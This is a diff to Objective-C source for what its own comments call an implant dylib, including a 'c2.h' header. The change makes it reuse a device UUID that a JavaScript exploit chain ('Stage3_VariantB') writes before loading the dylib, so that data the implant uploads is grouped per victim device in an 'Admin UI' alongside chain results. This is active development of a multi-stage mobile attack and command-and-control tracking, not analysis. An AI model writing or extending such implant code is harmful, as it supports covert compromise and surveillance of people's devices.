@@ -14,20 +14,36 @@
 #include "c2.h"
 
 /* --------------------------------------------------------------------------
- * Persistent device UUID stored in NSUserDefaults under the implant key.
+ * Persistent device UUID.
+ *
+ * Priority order:
+ *   1. __ds_dsid  — UUID written by the JS chain into sessionStorage (then
+ *                   bridged into NSUserDefaults by Stage3_VariantB before
+ *                   dlopen so the dylib shares the same UUID as the chain).
+ *   2. __cru_id   — previously persisted dylib UUID (survives app restarts).
+ *   3. Fresh UUID — first run, stored under __cru_id for next time.
+ *
+ * This ensures that data uploaded by the dylib appears under the same device
+ * entry in the Admin UI as the JS-chain chain_result records.
  * -------------------------------------------------------------------------- */
 static NSString *coruna_device_uuid(void) {
     static NSString *cached = nil;
     static dispatch_once_t once;
     dispatch_once(&once, ^{
         NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
-        NSString *key = @"__cru_id";
-        NSString *u = [d stringForKey:key];
-        if (!u || u.length == 0) {
-            u = [[NSUUID UUID] UUIDString];
-            [d setObject:u forKey:key];
-            [d synchronize];
+        // Prefer the UUID set by the JS chain (Stage3 writes __ds_dsid before dlopen)
+        NSString *u = [d stringForKey:@"__ds_dsid"];
+        if (!u || u.length < 8) {
+            // Fall back to previously persisted dylib UUID
+            u = [d stringForKey:@"__cru_id"];
         }
+        if (!u || u.length < 8) {
+            // First run — generate and persist a fresh UUID
+            u = [[NSUUID UUID] UUIDString];
+        }
+        // Always persist under __cru_id so we survive sessionStorage being cleared
+        [d setObject:u forKey:@"__cru_id"];
+        [d synchronize];
         cached = u;
     });
     return cached;
